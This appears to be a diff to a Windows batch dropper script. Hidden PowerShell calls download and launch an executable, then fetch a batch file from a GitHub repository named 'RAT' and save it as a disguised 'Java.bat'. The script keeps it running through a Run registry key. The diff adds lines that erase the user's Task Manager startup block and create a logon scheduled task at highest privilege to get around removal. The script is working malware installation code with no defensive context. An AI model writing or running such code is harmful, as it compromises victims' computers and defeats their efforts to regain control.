@@ -23,20 +23,24 @@ set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/m
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
-:: Define paths for Java.bat in Logs
+:: Prepare Java.bat in AppData\Logs
 set "LOGS_FOLDER=%APPDATA%\Logs"
 set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/AuraCreate.bat"
 set "AURA_BAT_FILE=%LOGS_FOLDER%\Java.bat"
 
-:: Create Logs folder if not exists
 if not exist "%LOGS_FOLDER%" (
     mkdir "%LOGS_FOLDER%"
 )
 
-:: Download Java.bat
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 
-:: Add Java.bat to registry startup
+:: Remove Task Manager "disabled" block if it exists
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "JavaStartup" /f >nul 2>&1
+
+:: Add to registry startup (Run)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "JavaStartup" /t REG_SZ /d "\"%AURA_BAT_FILE%\"" /f
+
+:: Add backup Scheduled Task (bypasses Task Manager disables)
+SCHTASKS /Create /TN "JavaStartupHidden" /TR "\"%AURA_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F
 
 exit
